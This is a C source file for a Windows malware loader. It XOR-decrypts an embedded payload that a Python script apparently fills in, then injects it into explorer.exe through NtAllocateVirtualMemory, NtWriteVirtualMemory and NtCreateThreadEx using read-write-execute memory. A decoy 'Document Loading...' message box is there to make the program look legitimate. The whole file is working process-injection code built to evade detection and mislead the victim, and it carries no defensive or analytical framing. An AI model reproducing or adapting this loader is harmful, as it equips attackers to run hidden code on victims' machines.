#include <windows.h>
#include <stdio.h>
#include <winternl.h>

// These will be replaced by the Python script
unsigned char encrypted_payload[] = {};
unsigned char decryption_key[] = {};

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    ULONG NumberOfBytesToWrite,
    PULONG NumberOfBytesWritten
);

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PPS_ATTRIBUTE_LIST AttributeList
);

void ReflectiveLoad() {
    // Decrypt the payload
    SIZE_T payload_size = sizeof(encrypted_payload);
    PBYTE decrypted_payload = (PBYTE)VirtualAlloc(NULL, payload_size, MEM_COMMIT, PAGE_READWRITE);
    
    for (SIZE_T i = 0; i < payload_size; i++) {
        decrypted_payload[i] = encrypted_payload[i] ^ decryption_key[i % sizeof(decryption_key)];
    }
    
    // Get NTAPI functions
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(ntdll, "NtWriteVirtualMemory");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
    
    // Target a trusted process (like explorer.exe)
    DWORD pid = 0;
    HANDLE hProcess = NULL;
    PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, L"explorer.exe") == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    
    if (pid == 0) {
        // Fallback to current process if explorer not found
        pid = GetCurrentProcessId();
    }
    
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    
    // Allocate memory in target process
    PVOID remoteMem = NULL;
    SIZE_T memSize = payload_size;
    NtAllocateVirtualMemory(hProcess, &remoteMem, 0, &memSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // Write decrypted payload
    ULONG bytesWritten = 0;
    NtWriteVirtualMemory(hProcess, remoteMem, decrypted_payload, payload_size, &bytesWritten);
    
    // Execute
    HANDLE hThread = NULL;
    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, remoteMem, NULL, 0, 0, 0, 0, NULL);
    
    // Cleanup
    VirtualFree(decrypted_payload, 0, MEM_RELEASE);
    if (hThread) CloseHandle(hThread);
    if (hProcess) CloseHandle(hProcess);
}

int main() {
    // Legitimate-looking activity
    MessageBoxA(NULL, "Document Loading...", "Information", MB_OK | MB_ICONINFORMATION);
    
    // Perform reflective injection
    ReflectiveLoad();
    
    return 0;
}
